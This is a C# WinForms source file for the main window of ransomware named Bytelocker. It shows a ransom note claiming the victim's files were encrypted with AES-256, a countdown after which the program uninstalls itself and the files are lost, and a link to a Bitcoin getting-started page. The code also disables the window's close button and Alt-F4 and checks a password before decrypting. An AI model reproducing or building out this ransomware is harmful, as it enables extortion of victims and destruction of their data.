using Bytelocker.CryptoManager;
using Bytelocker.Tools;
using System;
using System.Windows.Forms;

namespace Bytelocker.UI
{
    public partial class MainWindow : Form
    {
        private TimeManager tm;
        private PasswordManager pm;

        private LinkLabel llAESInfo, llListOfInfectedFiles;

        public MainWindow()
        {
            InitializeComponent();
            MaximizeBox = false;
            this.tm = new TimeManager();
            this.tm.ReadFromRegistry();
            llAESInfo = new LinkLabel();
            llListOfInfectedFiles = new LinkLabel();
            llListOfInfectedFiles.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llListOfInfectedFiles_Click);
            llAESInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llAESInfo_Click);
        }

        // remove x button
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ClassStyle = cp.ClassStyle | 0x200;
                return cp;
            }
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            this.MainWindowScreenOne();
        }

        private void MainWindowScreenOne()
        {
            this.BtnVerify.Hide();
            this.tbPassInput.Hide();
            this.rtfInfo.Clear();
            this.UpdateTime();

            llAESInfo.Show();
            llListOfInfectedFiles.Show();
            lbTitle.Show();


            // rtf box
            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");

            llListOfInfectedFiles.Text = "Here";
            llListOfInfectedFiles.AutoSize = true;
            llListOfInfectedFiles.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llListOfInfectedFiles);
            this.rtfInfo.AppendText(llListOfInfectedFiles.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" + "Encryption was produced" +
                " using");

            llAESInfo.Text = "AES-256";
            llAESInfo.AutoSize = true;
            llAESInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llAESInfo);
            this.rtfInfo.AppendText(llAESInfo.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n");

            this.rtfInfo.AppendText("NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
            // end rtf box
        }

        private void BtnNext_Click(object sender, EventArgs e)
        {
            this.rtfInfo.Clear();
            llAESInfo.Hide();
            llListOfInfectedFiles.Hide();

            this.lbTitle.Hide();
            this.tbPassInput.Show();
            this.BtnVerify.Show();

            this.rtfInfo.AppendText("Enter password to unlock:");
            this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(0), this.rtfInfo.Lines[0].Length);
            this.rtfInfo.SelectionBullet = true;
            this.rtfInfo.DeselectAll();
        }

        private void BtnVerify_Click(object sender, EventArgs e)
        {
            this.pm = new PasswordManager();
            this.pm.FetchPassword();
            if (!(this.tbPassInput.Text == this.pm.returnPassword()))
            {
                MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                this.tmTimeLeftRefresher.Stop();
                this.lbTimeLeft.Text = "";
                Bytelocker.Decrypt();
                Bytelocker.Uninstall();
            }
        }

        // override alt-f4
        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void On_llAESInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
        }

        private void On_llBitcoinInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://bitcoin.org/en/getting-started");
        }


        private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
        {
            this.LaunchListOfEncryptedFilesWindow();
        }

        private void UpdateTimeLeftEvent(object sender, EventArgs e)
        {
            this.UpdateTime();
        }

        private void UpdateTime()
        {
            int timeLeftSeconds = (int)this.tm.DetermineRemainingTimeInSeconds();

            if (timeLeftSeconds < 0)
            {
                this.tmTimeLeftRefresher.Stop();
                this.lbTimeLeft.Text = "00:00:00:00";

                // if time is 0, uninstall program
                Bytelocker.Uninstall();
            }
            else
            {
                this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
            }
        }


        private void LaunchListOfEncryptedFilesWindow()
        {
            EncryptedFilesList efl = new EncryptedFilesList();
            efl.ShowDialog();
        }
    }
}
